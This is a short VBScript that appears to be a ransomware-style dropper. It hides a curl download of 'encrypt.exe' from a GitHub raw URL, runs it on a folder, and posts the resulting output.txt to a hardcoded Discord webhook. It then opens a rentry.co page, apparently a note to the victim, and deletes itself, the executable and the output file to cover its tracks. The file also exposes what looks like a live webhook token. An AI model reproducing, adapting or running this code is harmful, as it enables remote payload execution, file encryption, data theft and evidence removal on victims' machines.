Option Explicit

Dim objFSO, objFSO2, objShell, objFile, objFile2, objShell2, objShell3
Dim url, localFilePath, strScriptPath, strBatPath, strFolderPath

' URL of the file to download using curl
url = "https://raw.githubusercontent.com/Sap196/PWS_new/main/encrypt.exe"

' Local path where the file will be saved
localFilePath = "encrypt.exe"

' Get the path of the script
strScriptPath = WScript.ScriptFullName

' Specify the path of the bat file
strBatPath = "encrypt.exe"
strFolderPath = "D:\\coding\\pws\\testfolder"

' Download the file using curl
Set objShell = CreateObject("WScript.Shell")
objShell.Run "curl -OL " & url & " -o " & localFilePath, 0, True
Set objShell = Nothing

' Hide the downloaded file
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.GetFile(localFilePath)
objFile.Attributes = objFile.Attributes + 2  ' Add the Hidden attribute

' Run the downloaded batch file
Set objShell = CreateObject("WScript.Shell")
objShell.Run "encrypt.exe " & strFolderPath, 0, True
Set objShell = Nothing

Set objFSO2 = CreateObject("Scripting.FileSystemObject")
Set objFile2 = objFSO2.GetFile("output.txt")
objFile2.Attributes = objFile2.Attributes + 2 

' Discord webhook URL
Dim discordWebhook
discordWebhook = "https://discord.com/api/webhooks/1202328029196730398/24xNitV8WYbF4qUql5MncBzaVeyDJfvAwLOsSdU8yPl17R4mwT8Juyo9TWGqi2FEfYBL"

' Construct the cURL command
Dim curlCommand
curlCommand = "curl -i -X POST -H ""Content-Type: multipart/form-data"" -F ""file=@output.txt"" " & discordWebhook

' Run the cURL command
Set objShell2 = CreateObject("WScript.Shell")
objShell2.Run curlCommand, 0, True

Dim objBrowser, webURL
Set objBrowser = CreateObject("WScript.Shell")
webURL = "https://rentry.co/9kpphkvk"
objBrowser.Run "%comspec% /c start " & webURL, 1, False
Set objBrowser = Nothing


' Delete the script file
Dim filesToDelete, file
filesToDelete = Array("output.txt", "encrypt.exe", strScriptPath)

' Delete each file
For Each file In filesToDelete
    If objFSO.FileExists(file) Then
        ' Delete the file
        objFSO.DeleteFile file
    End If
Next
